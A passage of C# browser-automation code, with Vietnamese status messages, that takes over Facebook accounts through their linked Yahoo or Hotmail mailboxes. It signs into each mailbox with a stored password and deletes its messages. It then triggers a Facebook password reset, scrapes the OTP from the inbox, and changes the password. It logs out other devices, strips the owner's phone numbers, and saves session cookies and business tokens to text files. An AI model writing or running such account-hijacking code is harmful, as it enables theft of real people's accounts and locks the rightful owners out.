                            chrome.Quit();
                            return;
                        }
                    }
                    catch { }

                    js.ExecuteScript("document.querySelector('#login-passwd').value='" + passYahoo + "'");
                    Thread.Sleep(1000);
                    js.ExecuteScript("document.querySelector('#login-signin').click();");

                    chrome.Url = "https://mail.yahoo.com";
                    Thread.Sleep(3000);
                    if (chrome.Url.Contains("https://login.yahoo.com"))
                    {
                        LoadStatusGrid("Lỗi đăng nhập!", "statusVia", i, 2, dtgvViaAcc);
                        chrome.Quit();
                        return;
                    }
                    else if (chrome.Url.Contains("https://mail.yahoo.com/?guccounter"))
                    {
                        chrome.Navigate().Refresh();
                        Thread.Sleep(1000);
                    }
                    LoadStatusGrid("Đăng nhập thành công", "statusVia", i, 1, dtgvViaAcc);
                    Thread.Sleep(2000);
                    try
                    {
                        chrome.FindElementByXPath("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[7]/div[1]/div[1]/div[1]/div[2]/button[1]").Click();
                        Thread.Sleep(1000);
                    }
                    catch { }

                    //delete
                    while (chrome.FindElementsByTagName("li").Where(x => { try { if (x.GetAttribute("role").Equals("rowgroup")) return true; else return false; } catch { return false; } }).ToList().Count() > 1)
                    {

                        try
                        {
                            var btnCheckAll = chrome.FindElementsByTagName("button").Where(x =>
                            {
                                try
                                {
                                    if (x.GetAttribute("tabindex").Equals("30"))
                                        return true;
                                    else
                                        return false;
                                }
                                catch
                                {
                                    return false;
                                };
                            }).ToList();
                            if (btnCheckAll.Count > 0)
                            {
                                btnCheckAll[0].Click();
                                Thread.Sleep(500);
                                try
                                {
                                    js.ExecuteScript("document.querySelector('#mail-app-component > div.W_6D6F.D_F > div > div.en_0 > div > div.D_F.em_N.gl_C > ul > li:nth-child(3) > div > button').click();");
                                }
                                catch { }
                                Thread.Sleep(500);
                                try
                                {
                                    js.ExecuteScript("document.querySelector('#modal-outer > div > div > div:nth-child(4) > button.P_1EudUu.C_52qC.r_P.y_Z2uhb3X.A_6EqO.cvhIH6_T.ir3_1JO2M7.cZ11XJIl_0.k_w.e_dRA.D_X.M_6LEV.o_v.p_R.V_M.t_C.cZ1RN91d_n.u_e69.i_3qGKe.H_A.cn_dBP.cg_FJ.l_Z2aVTcY.j_n.S_n.S4_n.I_Z2aVTcY.I3_Z2bdAhD.l3_Z2bdIi1.I0_Z2bdAhD.l0_Z2bdIi1.I4_Z2bdAhD.l4_Z2bdIi1').click()");
                                    Thread.Sleep(5000);
                                }
                                catch { }
                                chrome.Navigate().Refresh();
                            }
                        }
                        catch { }
                    }
                    Thread.Sleep(1000);
                    LoadStatusGrid("Đổi MK Facebook...", "statusVia", i, 1, dtgvViaAcc);
                    try
                    {
                        js.ExecuteScript("window.open();");
                    }
                    catch
                    {
                        chrome.FindElement(By.CssSelector("body")).SendKeys(OpenQA.Selenium.Keys.Control + "t");
                    }
                    Thread.Sleep(1500);
                    chrome.SwitchTo().Window(chrome.WindowHandles.Last());

                    //change facebook
                    chrome.Navigate().GoToUrl("https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar");
                    chrome.FindElementById("identify_email").SendKeys(email);
                    chrome.FindElementByName("did_submit").Click();
                    Thread.Sleep(4000);
                    chrome.FindElementByName("reset_action").Click();

                    string resetPassOTP = ""; bool isFind = false;
                    Thread.Sleep(1500);
                    chrome.SwitchTo().Window(chrome.WindowHandles.First());
                    LoadStatusGrid("Chờ OTP Mail...", "statusVia", i, 1, dtgvViaAcc);
                    int timeStart = Environment.TickCount; int indexMes = 1;
                    do
                    {
                        if (Environment.TickCount - timeStart > 95000)
                        {
                            LoadStatusGrid("Lỗi timeout!", "statusVia", i, 2, dtgvViaAcc);
                            chrome.Quit();
                            return;
                        }
                        //chrome.Navigate().GoToUrl("https://mail.yahoo.com/d/folders/1/messages/" + indexMes);
                        Thread.Sleep(2000);

                        string htmlYahoo = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                        string itemRow = Regex.Match(htmlYahoo, @"message-subject(.*?)</span>", RegexOptions.Singleline).Value;
                        resetPassOTP = Regex.Match(itemRow, @"\d{6}", RegexOptions.Singleline).Value;
                        if (resetPassOTP != "")
                        {
                            isFind = true;
                            break;
                        }
                        chrome.Navigate().Refresh();

                    } while (isFind == false);

                    if (isFind)
                    {
                        chrome.SwitchTo().Window(chrome.WindowHandles.Last());
                        Thread.Sleep(200);
                        if (ckbChangePass.Checked)
                        {
                            LoadStatusGrid("Đổi mật khẩu Facebook...", "statusVia", i, 1, dtgvViaAcc);
                            Thread.Sleep(200);
                            chrome.FindElementById("recovery_code_entry").SendKeys(resetPassOTP.Trim());
                            Thread.Sleep(500);
                            chrome.FindElementByName("reset_action").Click();
                            Thread.Sleep(3000);
                            if (ckbExport.Checked)
                            {
                                File.AppendAllText("linkreset.txt", chrome.Url + Environment.NewLine);
                                LoadStatusGrid("Xong!", "cStatusMail", i, 1, dtgvChangeVia);
                                chrome.Quit();
                                return;
                            }
                            //change new pass
                            chrome.FindElementById("password_new").SendKeys(passFacebook);
                            try
                            {
                                chrome.FindElementById("btn_continue").Click();
                            }
                            catch
                            {

                            }
                        }
                        else
                        {
                            LoadStatusGrid("Đăng nhập Facebook...", "statusVia", i, 1, dtgvViaAcc);
                            chrome.FindElementById("recovery_code_entry").SendKeys(resetPassOTP.Trim());
                            Thread.Sleep(500);
                            chrome.FindElementByName("reset_action").Click();
                            Thread.Sleep(3000);
                            if (ckbExport.Checked)
                            {
                                File.AppendAllText("linkreset.txt", chrome.Url + Environment.NewLine);
                                LoadStatusGrid("Xong!", "cStatusMail", i, 1, dtgvChangeVia);
                                chrome.Quit();
                                return;
                            }
                            chrome.FindElementById("skip_button").Click();
                        }
                        Thread.Sleep(5000);
                        if (chrome.Url.Contains("checkpoint"))
                        {
                            chrome.FindElementById("checkpointSubmitButton").Click();
                            Thread.Sleep(10000);
                            string cpstt = "Checkpoint: ";
                            var listCp = chrome.FindElementsByName("verification_method").ToList();
                            if (listCp.Count > 0)
                            {
                                for (int c = 0; c < listCp.Count; c++)
                                {
                                    string a = listCp[c].GetAttribute("value");
                                    if (a == "3")
                                        cpstt += "-Ảnh-";
                                    else if (a == "2")
                                        cpstt += "-Ngày sinh-";
                                    else if (a == "20")
                                    {
                                        cpstt += "-Tin nhắn-";
                                    }
                                    else if (a == "4" || a == "34")
                                    {
                                        cpstt += "-Số Điện Thoại-";
                                    }
                                    else if (a == "14")
                                    {
                                        cpstt += "-CP Thiết bị-";
                                    }
                                    else if (a == "26")
                                    {
                                        cpstt += "-Nhờ bạn bè-";
                                    }
                                }
                            }
                            LoadStatusGrid(cpstt, "statusVia", i, 3, dtgvViaAcc);
                            File.AppendAllText("account//checkpoint.txt", uidIm + "|" + passFacebook + "|||" + email + "|" + passYahoo + "\r\n");
                            chrome.Quit();
                            return;
                        }
                        else
                        {
                            if (ckbChangePass.Checked == false)
                            {

                                chrome.Navigate().GoToUrl("https://www.facebook.com/settings?tab=security&section=password&view");
                                Thread.Sleep(5000);
                                chrome.FindElementById("password_new").SendKeys(passFacebook);
                                chrome.FindElementById("password_confirm").SendKeys(passFacebook);
                                Thread.Sleep(5000);
                                chrome.FindElementByXPath("/html[1]/body[1]/div[1]/div[3]/div[1]/div[1]/div[2]/div[2]/div[2]/div[1]/div[1]/div[1]/div[1]/div[3]/div[2]/div[1]/div[1]/div[1]/div[1]/form[1]/div[1]/div[2]/div[1]/label[1]").Click();
                                Thread.Sleep(10000);
                                try
                                {
                                    chrome.FindElementByXPath("/html[1]/body[1]/div[9]/div[2]/div[1]/div[1]/form[1]/div[2]/div[3]/label[1]/input[1]").Click();
                                    Thread.Sleep(200);
                                    chrome.FindElementByXPath("/html[1]/body[1]/div[9]/div[2]/div[1]/div[1]/form[1]/div[3]/button[1]").Click();
                                }
                                catch { }
                                if (chrome.Url.Contains("checkpoint"))
                                {
                                    chrome.FindElementById("checkpointSubmitButton").Click();
                                    Thread.Sleep(10000);
                                    string cpstt = "Checkpoint: ";
                                    var listCp = chrome.FindElementsByName("verification_method").ToList();
                                    if (listCp.Count > 0)
                                    {
                                        for (int c = 0; c < listCp.Count; c++)
                                        {
                                            string a = listCp[c].GetAttribute("value");
                                            if (a == "3")
                                                cpstt += "-Ảnh-";
                                            else if (a == "2")
                                                cpstt += "-Ngày sinh-";
                                            else if (a == "20")
                                            {
                                                cpstt += "-Tin nhắn-";
                                            }
                                            else if (a == "4" || a == "34")
                                            {
                                                cpstt += "-Số Điện Thoại-";
                                            }
                                            else if (a == "14")
                                            {
                                                cpstt += "-CP Thiết bị-";
                                            }
                                            else if (a == "26")
                                            {
                                                cpstt += "-Nhờ bạn bè-";
                                            }
                                        }
                                    }
                                    LoadStatusGrid(cpstt, "statusVia", i, 3, dtgvViaAcc);
                                    File.AppendAllText("account//checkpoint.txt", uidIm + "|" + passFacebook + "|||" + email + "|" + passYahoo + "\r\n");
                                    if (ckbNoRegYahoo.Checked == true)
                                    {
                                        chrome.Manage().Cookies.DeleteAllCookies();
                                    }
                                    chrome.Quit();
                                    return;
                                }
                            }
                            else
                            {
                                Thread.Sleep(10000);
                                try
                                {
                                    chrome.Url = "https://www.facebook.com";
                                    Thread.Sleep(2000);
                                    chrome.FindElementById("email").SendKeys(email);
                                    chrome.FindElementById("pass").SendKeys(passFacebook);
                                    Thread.Sleep(1000);
                                    chrome.FindElementById("loginbutton").Click();
                                    Thread.Sleep(10000);
                                    try
                                    {
                                        chrome.FindElementByXPath("/html[1]/body[1]/div[9]/div[2]/div[1]/div[1]/form[1]/div[2]/div[3]/label[1]/input[1]");
                                        Thread.Sleep(500);
                                        chrome.FindElementByXPath("/html[1]/body[1]/div[9]/div[2]/div[1]/div[1]/form[1]/div[3]/button[1]").Click();
                                    }
                                    catch { }
                                }
                                catch { }
                                if (chrome.Url.Contains("checkpoint"))
                                {
                                    chrome.FindElementById("checkpointSubmitButton").Click();
                                    Thread.Sleep(10000);
                                    string cpstt = "Checkpoint: ";
                                    var listCp = chrome.FindElementsByName("verification_method").ToList();
                                    if (listCp.Count > 0)
                                    {
                                        for (int c = 0; c < listCp.Count; c++)
                                        {
                                            string a = listCp[c].GetAttribute("value");
                                            if (a == "3")
                                                cpstt += "-Ảnh-";
                                            else if (a == "2")
                                                cpstt += "-Ngày sinh-";
                                            else if (a == "20")
                                            {
                                                cpstt += "-Tin nhắn-";
                                            }
                                            else if (a == "4" || a == "34")
                                            {
                                                cpstt += "-Số Điện Thoại-";
                                            }
                                            else if (a == "14")
                                            {
                                                cpstt += "-CP Thiết bị-";
                                            }
                                            else if (a == "26")
                                            {
                                                cpstt += "-Nhờ bạn bè-";
                                            }
                                        }
                                    }
                                    LoadStatusGrid(cpstt, "statusVia", i, 4, dtgvViaAcc);
                                    File.AppendAllText("account//checkpoint.txt", uidIm + "|" + passFacebook + "|||" + email + "|" + passYahoo + "\r\n");
                                    if (ckbNoRegYahoo.Checked == true)
                                    {
                                        chrome.Manage().Cookies.DeleteAllCookies();
                                    }
                                    chrome.Quit();
                                    return;
                                }
                            }
                            if (ckbLogoutDevice.Checked)
                            {
                                if (!chrome.Url.Contains("password/change/reason/"))
                                {
                                    chrome.Url = "https://www.facebook.com/password/change/reason/";
                                }

                                LoadStatusGrid("Đăng xuất thiết bị...", "statusVia", i, 1, dtgvViaAcc);
                                try
                                {
                                    js.ExecuteScript("document.getElementById('u_0_3').click();");
                                    Thread.Sleep(500);
                                    var listbtn = chrome.FindElementsByTagName("button").Where(x => x.GetAttribute("value") == "1").ToList();
                                    if (listbtn.Count > 0)
                                    {
                                        for (int r = 0; r < listbtn.Count; r++)
                                        {
                                            if (listbtn[r].GetAttribute("class").Contains("selected"))
                                            {
                                                listbtn[r].Click();
                                                break;
                                            }
                                        }
                                    }
                                    Thread.Sleep(3000);
                                }
                                catch { }
                            }
                            chrome.Navigate().GoToUrl("https://www.facebook.com/profile");
                            var cc = chrome.Manage().Cookies.AllCookies.ToArray();

                            string uid = ""; bool isFindUid = false;
                            try
                            {
                                foreach (OpenQA.Selenium.Cookie cookie in cc)
                                {
                                    if (cookie.Name == "c_user")
                                    {
                                        uid = cookie.Value;
                                        isFindUid = true;
                                    }
                                }
                            }
                            catch { }
                            if (isFindUid == false)
                            {
                                chrome.Navigate().GoToUrl("https://www.facebook.com/profile");
                                Thread.Sleep(3000);
                                try
                                {
                                    chrome.FindElementById("checkpointSubmitButton").Click();
                                }
                                catch { }
                                string html = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                                uid = Regex.Match(html, "av=(.*?)\"").Groups[1].Value;
                            }
                            if (uid != "" && uid.Length < 25)
                            {
                                int countRemove = 0;
                                //remove phone
                                if (ckbDeleteInfo.Checked)
                                {
                                    chrome.Navigate().GoToUrl("https://www.facebook.com/settings?tab=mobile");
                                    Thread.Sleep(500);
                                    bool isHavePhone = true;
                                    var tt = chrome.FindElementsByTagName("img").Where(x =>
                                    {
                                        try
                                        {
                                            if (x.GetAttribute("class").Equals("uiLoadingIndicatorAsync img"))
                                                return true;
                                            else
                                                return false;
                                        }
                                        catch
                                        {
                                            return false;
                                        };
                                    }).ToList();
                                    int countDeletePhone = 0;
                                    do
                                    {
                                        if (tt.Count > 0)
                                        {
                                            string xp = FileXpathFromElement(js, tt[0]);
                                            string idBtnRemove = Regex.Match(xp, "id\\(\"(.*?)\"\\)").Groups[1].Value;
                                            if (!idBtnRemove.Equals(""))
                                            {
                                                chrome.FindElementById(idBtnRemove).Click();
                                                Thread.Sleep(1500);
                                                var cl = chrome.FindElementsByTagName("button").Where(x =>
                                                {
                                                    try
                                                    {
                                                        if (x.GetAttribute("class").Contains("layerConfirm"))
                                                            return true;
                                                        else
                                                            return false;
                                                    }
                                                    catch
                                                    {
                                                        return false;
                                                    };
                                                }).ToList();
                                                if (cl.Count > 0)
                                                {
                                                    cl[0].Click();
                                                    Thread.Sleep(1500);
                                                    try
                                                    {
                                                        chrome.FindElementById("ajax_password").SendKeys(passFacebook);
                                                    }
                                                    catch { }
                                                    cl = chrome.FindElementsByTagName("button").Where(x =>
                                                    {
                                                        try
                                                        {
                                                            if (x.GetAttribute("class").Contains("layerConfirm"))
                                                                return true;
                                                            else
                                                                return false;
                                                        }
                                                        catch
                                                        {
                                                            return false;
                                                        };
                                                    }).ToList();
                                                    if (cl.Count > 0)
                                                    {
                                                        cl[0].Click();
                                                        countDeletePhone++;
                                                        Thread.Sleep(1500);
                                                    }
                                                }
                                            }
                                            tt = chrome.FindElementsByTagName("img").Where(x =>
                                            {
                                                try
                                                {
                                                    if (x.GetAttribute("class").Equals("uiLoadingIndicatorAsync img"))
                                                        return true;
                                                    else
                                                        return false;
                                                }
                                                catch
                                                {
                                                    return false;
                                                };
                                            }).ToList();
                                            if (tt.Count <= 0)
                                            {
                                                isHavePhone = false;
                                                break;
                                            }
                                        }
                                        else
                                        {
                                            break;
                                        }
                                    } while (isHavePhone == true);
                                }

                                var cookies = chrome.Manage().Cookies.AllCookies;
                                string cook = "";
                                var session = chrome.Manage().Cookies.AllCookies.ToArray();
                                foreach (OpenQA.Selenium.Cookie cookie in session)
                                {
                                    cook += cookie.Name + "=" + cookie.Value + ";";
                                }
                                if (ckbHideMail.Checked)
                                {
                                    ChangePryvacyMail(cook);
                                }
                                string token = "";
                                if (checkBox1.Checked)
                                    token = GetTokenBussinessFromCookie(cook);
                                File.AppendAllText("account//live.txt", uid + "|" + passFacebook + "|" + token + "|" + cook + "|" + email + "|" + passYahoo + "\r\n");
                                LoadStatusGrid("Thành công!", "statusVia", i, 4, dtgvViaAcc);
                                chrome.Quit();
                            }
                            else
                            {
                                LoadStatusGrid("Lỗi!", "statusVia", i, 2, dtgvViaAcc);
                                chrome.Quit();
                            }
                        }
                    }
                    else
                    {
                        File.AppendAllText("account//nootp.txt", email + "|" + passFacebook + "|" + email + "|" + passYahoo + "\r\n");
                        dtgvChangeVia.Rows[i].Cells["cStatusMail"].Value = "Không nhận được OTP!";
                    }
                }
                else if (email.EndsWith("hotmail.com"))
                {
                    LoadStatusGrid("Đang đăng nhập...", "statusVia", i, 1, dtgvViaAcc);
                    ChromeOptions options = new ChromeOptions();
                    options.AddArgument("--disable-notifications"); // to disable notification
                    options.AddArgument("--window-size=700,700");
                    options.AddArgument("--window-position=0,0");
                    options.AddArgument("--blink-settings=imagesEnabled=false");
                    //options.AddArgument("--user-agent=" + userAgents[rd.Next(0, userAgents.Length)]);
                    if (ckbProfile.Checked)
                    {
                        if (uidIm != "")
                        {
                            string profilePath = @"profile/" + uidIm;
                            if (!Directory.Exists(profilePath))
                            {
                                Directory.CreateDirectory(profilePath);
                            }
                            options.AddArgument("--user-data-dir=" + profilePath);
                        }
                        else
                        {
                            LoadStatusGrid("Không có UID", "statusVia", i, 2, dtgvViaAcc);
                            return;
                        }
                    }
                    ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                    service.HideCommandPromptWindow = true;
                    try
                    {
                        chrome = new ChromeDriver(service, options, TimeSpan.FromSeconds(120));
                    }
                    catch
                    {
                        chrome = new ChromeDriver(service, new ChromeOptions(), TimeSpan.FromSeconds(120));
                    }

                    chrome.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);
                    chrome.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(120);
                    IJavaScriptExecutor js = chrome as IJavaScriptExecutor;
                    chrome.Navigate().GoToUrl("https://login.live.com/");
                    chrome.FindElementById("i0116").SendKeys(email);
                    Thread.Sleep(1000);
                    //chrome.FindElementById("login-signin").Click();
                    js.ExecuteScript("document.querySelector('#idSIButton9').click();");
                    Thread.Sleep(3000);
                    try
                    {
                        if (chrome.FindElementById("usernameError").Displayed)
                        {
                            LoadStatusGrid("Mail chưa đăng kí", "statusVia", i, 2, dtgvViaAcc);
                            chrome.Quit();
                            return;
                        }
                    }
                    catch { }

                    chrome.FindElementById("i0118").SendKeys(passYahoo);
                    //js.ExecuteScript("document.querySelector('#i0118').value='" + passYahoo + "'");
                    Thread.Sleep(1000);
                    js.ExecuteScript("document.querySelector('#idSIButton9').click();");
                    Thread.Sleep(3000);
                    if (chrome.Url.Contains("account.microsoft.com") || chrome.Url.Contains("outlook.live.com"))
                    {
                        LoadStatusGrid("Đăng nhập thành công", "statusVia", i, 1, dtgvViaAcc);
                        chrome.Url = "https://outlook.live.com/mail/inbox";
                        Thread.Sleep(5000);
                        chrome.Navigate().Refresh();
                        Thread.Sleep(5000);
                        string htmlHotmail = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                        try
                        {
                            try
                            {
                                htmlHotmail = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                                if (htmlHotmail.Contains("Continue to Site"))
                                {
                                    string divClickContine = Regex.Match(htmlHotmail, "class=\"ms-Button-label(.*?)Continue to Site").Value;
                                    MatchCollection idClickContines = Regex.Matches(divClickContine, @"id__\d{2}");
                                    string idneed = idClickContines[idClickContines.Count - 1].Value;
                                    try
                                    {
                                        chrome.FindElementById(idneed).Click();
                                    }
                                    catch
                                    {
                                        try
                                        {
                                            chrome.FindElementById("id__66").Click();
                                        }
                                        catch { }
                                    }
                                }

                                if (chrome.Url.Contains("outlook.live.com"))
                                {
                                    var buttonTabs = chrome.FindElementsByTagName("button").Where(x => x.GetAttribute("id").Contains("Pivot")).ToList();
                                    string preIdTab = "";
                                    if (buttonTabs.Count > 0)
                                    {
                                        for (int j = 0; j < buttonTabs.Count; j++)
                                        {
                                            if (buttonTabs[j].GetAttribute("id").Contains("Tab1"))
                                            {
                                                preIdTab = buttonTabs[j].GetAttribute("id").Split('-')[0];
                                            }
                                        }
                                    }
                                    //if (preIdTab == "")
                                    //{
                                    //    LoadStatusGrid("Lỗi!", "statusVia", i, 2, dtgvViaAcc);
                                    //    chrome.Quit();
                                    //    return;
                                    //}

                                    try
                                    {
                                        js.ExecuteScript("window.open();");
                                    }
                                    catch
                                    {
                                        chrome.FindElement(By.CssSelector("body")).SendKeys(OpenQA.Selenium.Keys.Control + "t");
                                    }
                                    Thread.Sleep(1500);
                                    chrome.SwitchTo().Window(chrome.WindowHandles.Last());

                                    //change facebook
                                    chrome.Navigate().GoToUrl("https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar");
                                    chrome.FindElementById("identify_email").SendKeys(email);
                                    chrome.FindElementByName("did_submit").Click();
                                    Thread.Sleep(4000);
                                    chrome.FindElementByName("reset_action").Click();

                                    string resetPassOTP = "";
                                    Thread.Sleep(1500);
                                    chrome.SwitchTo().Window(chrome.WindowHandles.First());
                                    LoadStatusGrid("Chờ OTP Mail...", "statusVia", i, 1, dtgvViaAcc);
                                    int timeStart = Environment.TickCount;
                                    bool isHaveCodeFb = false;
                                    try
                                    {
                                        Thread.Sleep(1000);
                                        htmlHotmail = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                                        if (htmlHotmail.Contains("Continue to Site"))
                                        {
                                            string divClickContine = Regex.Match(htmlHotmail, "class=\"ms-Button-label(.*?)Continue to Site").Value;
                                            MatchCollection idClickContines = Regex.Matches(divClickContine, @"id__\d{2}");
                                            string idneed = idClickContines[idClickContines.Count - 1].Value;
                                            chrome.FindElementById(idneed).Click();
                                        }
                                    }
                                    catch { }
                                    do
                                    {
                                        if (Environment.TickCount - timeStart > 175000)
                                        {
                                            chrome.Quit();
                                            LoadStatusGrid("Lỗi timeout!", "statusVia", i, 2, dtgvViaAcc);
                                            return;
                                        }
                                        try
                                        {
                                            buttonTabs = chrome.FindElementsByTagName("button").Where(x => x.GetAttribute("id").Contains("Pivot")).ToList();
                                            if (buttonTabs.Count > 0)
                                            {
                                                for (int j = 0; j < buttonTabs.Count; j++)
                                                {
                                                    if (buttonTabs[j].GetAttribute("id").Contains("Tab1"))
                                                    {
                                                        preIdTab = buttonTabs[j].GetAttribute("id").Split('-')[0];
                                                    }
                                                }
                                            }
                                            for (int t = 0; t <= 1; t++)
                                            {

                                                chrome.FindElementById(preIdTab + "-" + "Tab" + t).Click();
                                                Thread.Sleep(3000);
                                                htmlHotmail = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                                                string itemrow = Regex.Match(htmlHotmail, @"AQAAAAA(.*?)>", RegexOptions.Singleline).Value;
                                                resetPassOTP = Regex.Match(itemrow, @"\d{6}", RegexOptions.Singleline).Value;
                                                if (resetPassOTP.Trim() != "")
                                                {
                                                    isHaveCodeFb = true;
                                                    break;
                                                }
                                                Thread.Sleep(4000);
                                            }

                                        }
                                        catch (Exception ex)
                                        {
                                            //if have code
                                            htmlHotmail = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                                            string itemrow = Regex.Match(htmlHotmail, @"AQAAAAA(.*?)>", RegexOptions.Singleline).Value;
                                            resetPassOTP = Regex.Match(itemrow, @"\d{6}", RegexOptions.Singleline).Value;
                                            if (resetPassOTP.Trim() != "")
                                            {
                                                isHaveCodeFb = true;
                                                break;
                                            }
                                            chrome.Navigate().Refresh();
                                            Thread.Sleep(8000);
                                            htmlHotmail = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                                            if (htmlHotmail.Contains("The new Outlook.com is ready for prime time"))
                                            {
                                                try
                                                {
                                                    var tt = chrome.FindElementsByTagName("i").Where(x =>
                                                    {
                                                        try
                                                        {
                                                            if (x.GetAttribute("data-icon-name").Equals("ChevronRight"))
                                                                return true;
                                                            else
                                                                return false;
                                                        }
                                                        catch
                                                        {
                                                            return false;
                                                        };
                                                    }).ToList();
                                                    tt[0].Click();
                                                }
                                                catch { }
                                            }
                                            else if (htmlHotmail.Contains("Continue to Site"))
                                            {
                                                try
                                                {
                                                    string divClickContine = Regex.Match(htmlHotmail, "class=\"ms-Button-label(.*?)Continue to Site").Value;
                                                    MatchCollection idClickContines = Regex.Matches(divClickContine, @"id__\d{2}");
                                                    string idneed = idClickContines[idClickContines.Count - 1].Value;
                                                    chrome.FindElementById(idneed).Click();
                                                }
                                                catch
                                                {
                                                    try
                                                    {
                                                        chrome.FindElementById("id__66").Click();
                                                    }
                                                    catch { }
                                                    try
                                                    {
                                                        chrome.FindElementById("id__78").Click();
                                                    }
                                                    catch { }
                                                }

                                            }
                                        }

                                    } while (isHaveCodeFb == false);

                                    if (isHaveCodeFb)
                                    {
                                        chrome.SwitchTo().Window(chrome.WindowHandles.Last());
                                        if (ckbChangePass.Checked)
                                        {
                                            LoadStatusGrid("Đổi mật khẩu Facebook...", "statusVia", i, 1, dtgvViaAcc);
                                            Thread.Sleep(200);
                                            chrome.FindElementById("recovery_code_entry").SendKeys(resetPassOTP.Trim());
                                            Thread.Sleep(500);
                                            chrome.FindElementByName("reset_action").Click();
                                            Thread.Sleep(3000);
                                            if (ckbExport.Checked)
                                            {
                                                File.AppendAllText("linkreset.txt", chrome.Url + Environment.NewLine);
                                                LoadStatusGrid("Xong!", "cStatusMail", i, 1, dtgvChangeVia);
                                                chrome.Quit();
                                                return;
                                            }
                                            //change new pass
                                            chrome.FindElementById("password_new").SendKeys(passFacebook);
                                            try
                                            {
                                                chrome.FindElementById("btn_continue").Click();
                                            }
                                            catch
                                            {

                                            }
                                        }
                                        else
                                        {
                                            LoadStatusGrid("Đăng nhập Facebook...", "statusVia", i, 1, dtgvViaAcc);
                                            chrome.FindElementById("recovery_code_entry").SendKeys(resetPassOTP.Trim());
                                            Thread.Sleep(500);
                                            chrome.FindElementByName("reset_action").Click();
                                            Thread.Sleep(3000);
                                            if (ckbExport.Checked)
                                            {
                                                File.AppendAllText("linkreset.txt", chrome.Url + Environment.NewLine);
                                                LoadStatusGrid("Xong!", "cStatusMail", i, 1, dtgvChangeVia);
                                                chrome.Quit();
                                                return;
                                            }
                                            chrome.FindElementById("skip_button").Click();
                                        }

                                        Thread.Sleep(5000);
                                        if (chrome.Url.Contains("checkpoint"))
                                        {
                                            chrome.FindElementById("checkpointSubmitButton").Click();
                                            Thread.Sleep(10000);
                                            string cpstt = "Checkpoint: ";
                                            var listCp = chrome.FindElementsByName("verification_method").ToList();
                                            if (listCp.Count > 0)
                                            {
                                                for (int c = 0; c < listCp.Count; c++)
                                                {
                                                    string a = listCp[c].GetAttribute("value");
                                                    if (a == "3")
                                                        cpstt += "-Ảnh-";
                                                    else if (a == "2")
                                                        cpstt += "-Ngày sinh-";
                                                    else if (a == "20")
                                                    {
                                                        cpstt += "-Tin nhắn-";
                                                    }
                                                    else if (a == "4" || a == "34")
                                                    {
                                                        cpstt += "-Số Điện thoại-";
                                                    }
                                                    else if (a == "14")
                                                    {
                                                        cpstt += "-Thiết bị-";
                                                    }
                                                    else if (a == "26")
                                                    {
                                                        cpstt += "-Nhờ bạn bè-";
                                                    }
                                                }
                                            }
                                            LoadStatusGrid(cpstt, "statusVia", i, 3, dtgvViaAcc);
                                            File.AppendAllText("account//checkpoint.txt", uidIm + "|" + passFacebook + "|||" + email + "|" + passYahoo + "\r\n");
                                            chrome.Quit();
                                            return;
                                        }
                                        else
                                        {
                                            if (ckbChangePass.Checked == false)
                                            {

                                                chrome.Navigate().GoToUrl("https://www.facebook.com/settings?tab=security&section=password&view");
                                                Thread.Sleep(5000);
                                                chrome.FindElementById("password_new").SendKeys(passFacebook);
                                                chrome.FindElementById("password_confirm").SendKeys(passFacebook);
                                                Thread.Sleep(5000);
                                                chrome.FindElementByXPath("/html[1]/body[1]/div[1]/div[3]/div[1]/div[1]/div[2]/div[2]/div[2]/div[1]/div[1]/div[1]/div[1]/div[3]/div[2]/div[1]/div[1]/div[1]/div[1]/form[1]/div[1]/div[2]/div[1]/label[1]").Click();
                                                Thread.Sleep(10000);
                                                try
                                                {
                                                    chrome.FindElementByXPath("/html[1]/body[1]/div[9]/div[2]/div[1]/div[1]/form[1]/div[2]/div[3]/label[1]/input[1]").Click();
                                                    Thread.Sleep(200);
                                                    chrome.FindElementByXPath("/html[1]/body[1]/div[9]/div[2]/div[1]/div[1]/form[1]/div[3]/button[1]").Click();
                                                }
                                                catch { }
                                                if (chrome.Url.Contains("checkpoint"))
                                                {
                                                    chrome.FindElementById("checkpointSubmitButton").Click();
                                                    Thread.Sleep(10000);
                                                    string cpstt = "Checkpoint: ";
                                                    var listCp = chrome.FindElementsByName("verification_method").ToList();
                                                    if (listCp.Count > 0)
                                                    {
                                                        for (int c = 0; c < listCp.Count; c++)
                                                        {
                                                            string a = listCp[c].GetAttribute("value");
                                                            if (a == "3")
                                                                cpstt += "-Ảnh-";
                                                            else if (a == "2")
                                                                cpstt += "-Ngày sinh-";
                                                            else if (a == "20")
                                                            {
                                                                cpstt += "-Tin nhắn-";
                                                            }
                                                            else if (a == "4" || a == "34")
                                                            {
                                                                cpstt += "-Số Điện Thoại-";
                                                            }
                                                            else if (a == "14")
                                                            {
                                                                cpstt += "-CP Thiết bị-";
                                                            }
                                                            else if (a == "26")
                                                            {
                                                                cpstt += "-Nhờ bạn bè-";
                                                            }
                                                        }
                                                    }
                                                    LoadStatusGrid(cpstt, "statusVia", i, 3, dtgvViaAcc);
                                                    File.AppendAllText("account//checkpoint.txt", uidIm + "|" + passFacebook + "|||" + email + "|" + passYahoo + "\r\n");
                                                    if (ckbNoRegYahoo.Checked == true)
                                                    {
                                                        chrome.Manage().Cookies.DeleteAllCookies();
                                                    }
                                                    chrome.Quit();
                                                    return;
                                                }
                                            }
                                            else
                                            {
                                                Thread.Sleep(10000);
                                                try
                                                {
                                                    chrome.Url = "https://www.facebook.com";
                                                    Thread.Sleep(2000);
                                                    chrome.FindElementById("email").SendKeys(email);
                                                    chrome.FindElementById("pass").SendKeys(passFacebook);
                                                    Thread.Sleep(1000);
                                                    chrome.FindElementById("loginbutton").Click();
                                                    Thread.Sleep(10000);
                                                    try
                                                    {
